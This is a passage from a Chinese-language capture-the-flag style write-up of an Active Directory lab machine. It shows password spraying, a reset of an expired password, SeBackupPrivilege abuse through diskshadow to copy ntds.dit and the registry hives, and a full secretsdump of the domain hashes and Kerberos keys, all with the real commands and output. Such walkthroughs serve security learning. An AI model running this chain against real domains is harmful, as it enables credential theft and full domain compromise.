<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> result.txt| grep <span class="string">&#x27;OU=&#x27;</span>                       </span><br><span class="line">member: CN=Ian Walker,OU=dev,DC=baby,DC=vl</span><br><span class="line">member: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl</span><br><span class="line">member: CN=Hugh George,OU=dev,DC=baby,DC=vl</span><br><span class="line">member: CN=Ashley Webb,OU=dev,DC=baby,DC=vl</span><br><span class="line">member: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl</span><br><span class="line">distinguishedName: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl</span><br><span class="line">distinguishedName: CN=Ashley Webb,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Hugh George,OU=dev,DC=baby,DC=vl</span><br><span class="line">distinguishedName: CN=Hugh George,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl</span><br><span class="line">distinguishedName: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl</span><br><span class="line">member: CN=Caroline Robinson,OU=it,DC=baby,DC=vl</span><br><span class="line">member: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br><span class="line">member: CN=Kerry Wilson,OU=it,DC=baby,DC=vl</span><br><span class="line">member: CN=Joseph Hughes,OU=it,DC=baby,DC=vl</span><br><span class="line">member: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl</span><br><span class="line">distinguishedName: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl</span><br><span class="line">distinguishedName: CN=Joseph Hughes,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl</span><br><span class="line">distinguishedName: CN=Kerry Wilson,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br><span class="line">distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl</span><br></pre></td></tr></table></figure>

<p>终于出来一个不一样的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb <span class="variable">$IP</span> -u user.txt -p <span class="string">&#x27;BabyStart123!&#x27;</span> --continue-on-success</span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure>

<p>改一下密码试试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ changepasswd.py baby.vl/Caroline.Robinson:<span class="string">&#x27;BabyStart123!&#x27;</span>@<span class="variable">$IP</span> -newpass <span class="string">&#x27;maneisgreat&#x27;</span></span><br><span class="line">/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Changing the password of baby.vl\Caroline.Robinson</span><br><span class="line">[*] Connecting to DCE/RPC as baby.vl\Caroline.Robinson</span><br><span class="line">[!] Password is expired or must be changed, trying to <span class="built_in">bind</span> with a null session.</span><br><span class="line">[*] Connecting to DCE/RPC as null session</span><br><span class="line">[-] Some password update rule has been violated. For example, the password <span class="built_in">history</span> policy may prohibit the use of recent passwords or the password may not meet length criteria.</span><br><span class="line"></span><br><span class="line">$ changepasswd.py baby.vl/Caroline.Robinson:<span class="string">&#x27;BabyStart123!&#x27;</span>@<span class="variable">$IP</span> -newpass <span class="string">&#x27;Mane1sgreat&#x27;</span></span><br><span class="line">/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Changing the password of baby.vl\Caroline.Robinson</span><br><span class="line">[*] Connecting to DCE/RPC as baby.vl\Caroline.Robinson</span><br><span class="line">[!] Password is expired or must be changed, trying to <span class="built_in">bind</span> with a null session.</span><br><span class="line">[*] Connecting to DCE/RPC as null session</span><br><span class="line">[*] Password was changed successfully.</span><br></pre></td></tr></table></figure>

<p>有密码策略的显示，只能祭出大杀招了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb <span class="variable">$IP</span> -u Caroline.Robinson -p Mane1sgreat</span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.188.67   445    BABYDC           [+] baby.vl\Caroline.Robinson:Mane1sgreat </span><br><span class="line"></span><br><span class="line">$ nxc winrm <span class="variable">$IP</span> -u Caroline.Robinson -p Mane1sgreat</span><br><span class="line">WINRM       10.129.188.67   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class="line">WINRM       10.129.188.67   5985   BABYDC           [+] baby.vl\Caroline.Robinson:Mane1sgreat (Pwn3d!)</span><br></pre></td></tr></table></figure>

<h2 id="Shell-As-Caroline-Robinson"><a href="#Shell-As-Caroline-Robinson" class="headerlink" title="Shell As Caroline.Robinson"></a>Shell As Caroline.Robinson</h2><h3 id="SeBackupPrivilege-Privilege-Escalation"><a href="#SeBackupPrivilege-Privilege-Escalation" class="headerlink" title="SeBackupPrivilege Privilege Escalation"></a>SeBackupPrivilege Privilege Escalation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm-py PS C:\Users\Caroline.Robinson\desktop&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State  </span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br></pre></td></tr></table></figure>

<p>权限挺多，滥用<code>SeBackupPrivilege</code>提权了，可以参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kqdssheng/p/18741609">Windows 提权-SeBackupPrivilege</a>和<a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeBackupPrivilege">SeBackupPrivilege</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm-py PS C:\wansh&gt; <span class="built_in">echo</span> <span class="string">&quot;set context persistent nowriters&quot;</span> | out-file ./diskshadow.txt -encoding ascii</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;add volume c: alias temp&quot;</span> | out-file ./diskshadow.txt -encoding ascii -append</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;create&quot;</span> | out-file ./diskshadow.txt -encoding ascii -append</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;expose %temp% z:&quot;</span> | out-file ./diskshadow.txt -encoding ascii -append</span><br><span class="line">                                                    </span><br><span class="line">evil-winrm-py PS C:\wansh&gt; <span class="built_in">dir</span>                                                                           </span><br><span class="line">                                                                                                         </span><br><span class="line">                                                                                                         </span><br><span class="line">    Directory: C:\wansh       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                   </span><br><span class="line">----                 -------------         ------ ----                                                                   </span><br><span class="line">-a----         9/23/2025   9:00 AM             86 diskshadow.txt                                                         </span><br><span class="line">-a----         9/23/2025   8:58 AM          12288 SeBackupPrivilegeCmdLets.dll                                           </span><br><span class="line">-a----         9/23/2025   8:59 AM          16384 SeBackupPrivilegeUtils.dll  </span><br><span class="line"></span><br><span class="line">evil-winrm-py PS C:\wansh&gt; diskshadow.exe /s c:\wansh\diskshadow.txt                                                                                                                                               </span><br><span class="line">Microsoft DiskShadow version 1.0                                                                                                                                                                                   </span><br><span class="line">Copyright (C) 2013 Microsoft Corporation                                                                                                                                                                           </span><br><span class="line">On computer:  BABYDC,  9/23/2025 9:01:05 AM</span><br><span class="line"></span><br><span class="line">-&gt; <span class="built_in">set</span> context persistent nowriters                                                                      </span><br><span class="line">-&gt; add volume c: <span class="built_in">alias</span> temp          </span><br><span class="line">-&gt; create</span><br><span class="line">Alias temp <span class="keyword">for</span> shadow ID &#123;b6dd0875-fbcc-40f2-85a6-bf7c6b7a9872&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET <span class="keyword">for</span> shadow <span class="built_in">set</span> ID &#123;2b3c3687-1494-4af3-873d-d874c405eccc&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy <span class="built_in">set</span> ID &#123;2b3c3687-1494-4af3-873d-d874c405eccc&#125;</span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line">        * Shadow copy ID = &#123;b6dd0875-fbcc-40f2-85a6-bf7c6b7a9872&#125;               %temp%</span><br><span class="line">                - Shadow copy <span class="built_in">set</span>: &#123;2b3c3687-1494-4af3-873d-d874c405eccc&#125;       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = 1</span><br><span class="line">                - Original volume name: \\?\Volume&#123;711fc68a-0000-0000-0000-100000000000&#125;\ [C:\]</span><br><span class="line">                - Creation <span class="keyword">time</span>: 9/23/2025 9:01:05 AM</span><br><span class="line">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line">                - Originating machine: BabyDC.baby.vl</span><br><span class="line">                - Service machine: BabyDC.baby.vl</span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %temp% z:</span><br><span class="line">-&gt; %temp% = &#123;b6dd0875-fbcc-40f2-85a6-bf7c6b7a9872&#125;</span><br><span class="line">The shadow copy was successfully exposed as z:\.</span><br><span class="line">-&gt; </span><br><span class="line">evil-winrm-py PS C:\wansh&gt; Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line">evil-winrm-py PS C:\wansh&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">evil-winrm-py PS C:\wansh&gt; Copy-FileSeBackupPrivilege Z:\Windows\NTDS\ntds.dit C:\wansh\ntds.dit</span><br><span class="line">evil-winrm-py PS C:\wansh&gt; reg save HKLM\SYSTEM system</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">evil-winrm-py PS C:\wansh&gt; reg save HKLM\SAM sam</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/images/baby-2.png" data-caption=""><img src="/images/baby-2.png"></a></p>
<p>下载下来dump hash就可以了</p>
<p><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::</code></p>
<p>登录一下</p>
<p><a data-fancybox="gallery" data-src="/images/baby-3.png" data-caption=""><img src="/images/baby-3.png"></a></p>
<h2 id="Shell-As-Administrator"><a href="#Shell-As-Administrator" class="headerlink" title="Shell As Administrator"></a>Shell As Administrator</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -ntds ntds.dit -sam sam -system system <span class="built_in">local</span>                                                                                                                                                      </span><br><span class="line">/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> </span><br><span class="line">removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.                                                                                                                           </span><br><span class="line">  import pkg_resources                                                                                                                                                                                             </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                              </span><br><span class="line">                                                                                                         </span><br><span class="line">[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88                                                                                                                                                      </span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)                                                     </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::                                                                                                                             </span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                     </span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                            </span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information. </span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                      </span></span><br><span class="line"><span class="string">[*] Searching for pekList, be patient                                                                                                                                                                              </span></span><br><span class="line"><span class="string">[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6                                                                                                                                                  </span></span><br><span class="line"><span class="string">[*] Reading and decrypting hashes from ntds.dit                                                                                                                                                                    </span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                           </span></span><br><span class="line"><span class="string">BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::                                                                                                                                  </span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::                                                                                                                                    </span></span><br><span class="line"><span class="string">baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::                                                                                                               </span></span><br><span class="line"><span class="string">baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::                                                                                                                      </span></span><br><span class="line"><span class="string">baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::            </span></span><br><span class="line"><span class="string">baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::</span></span><br><span class="line"><span class="string">baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::                                                                                                                       </span></span><br><span class="line"><span class="string">baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::                                                                                                                 </span></span><br><span class="line"><span class="string">baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::                                                                                                                    </span></span><br><span class="line"><span class="string">baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::           </span></span><br><span class="line"><span class="string">baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::            </span></span><br><span class="line"><span class="string">baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::                                                                                                                </span></span><br><span class="line"><span class="string">[*] Kerberos keys from ntds.dit                                                                          </span></span><br><span class="line"><span class="string">Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4</span></span><br><span class="line"><span class="string">Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d                                   </span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:d38cb994ae806b97                                                                                                                                                                         </span></span><br><span class="line"><span class="string">BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192</span></span><br><span class="line"><span class="string">BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b                                                                                                                                                   </span></span><br><span class="line"><span class="string">BABYDC$:des-cbc-md5:8fef68979223d645                                                                     </span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97          </span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14                                                                                                                                                    </span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:d57383f1b3130de5                                                                      </span></span><br><span class="line"><span class="string">baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084                                                                               </span></span><br><span class="line"><span class="string">baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032                      </span></span><br><span class="line"><span class="string">baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b </span></span><br><span class="line"><span class="string">baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039                                                                                                       </span></span><br><span class="line"><span class="string">baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528                                                                                                                                       </span></span><br><span class="line"><span class="string">baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e                                                                                                                                                                   </span></span><br><span class="line"><span class="string">baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258                                                                                                       </span></span><br><span class="line"><span class="string">baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc                                                                                                                                       </span></span><br><span class="line"><span class="string">baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e                                                         </span></span><br><span class="line"><span class="string">baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd                                                                                                      </span></span><br><span class="line"><span class="string">baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a                            </span></span><br><span class="line"><span class="string">baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7                                                                                                                                                                  </span></span><br><span class="line"><span class="string">baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784                                                                                                        </span></span><br><span class="line"><span class="string">baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df                                                                                                                                        </span></span><br><span class="line"><span class="string">baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c                                                          </span></span><br><span class="line"><span class="string">baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e                                                                                                  </span></span><br><span class="line"><span class="string">baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b                                                                                                                                  </span></span><br><span class="line"><span class="string">baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3                                                                                                                                                              </span></span><br><span class="line"><span class="string">baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41                                                                                                     </span></span><br><span class="line"><span class="string">baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723        </span></span><br><span class="line"><span class="string">baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245                                                       </span></span><br><span class="line"><span class="string">baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb                                                                                                      </span></span><br><span class="line"><span class="string">baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01                                                                                                                                      </span></span><br><span class="line"><span class="string">baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe                                                                                                                                                                  </span></span><br><span class="line"><span class="string">baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84                                                                                                       </span></span><br><span class="line"><span class="string">baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66                             </span></span><br><span class="line"><span class="string">baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9                                                         </span></span><br><span class="line"><span class="string">baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af                                                                                                 </span></span><br><span class="line"><span class="string">baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9                                                                                                                                 </span></span><br><span class="line"><span class="string">baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df                                                                                                                                                             </span></span><br><span class="line"><span class="string">[*] Cleaning up...  </span></span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
        
          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
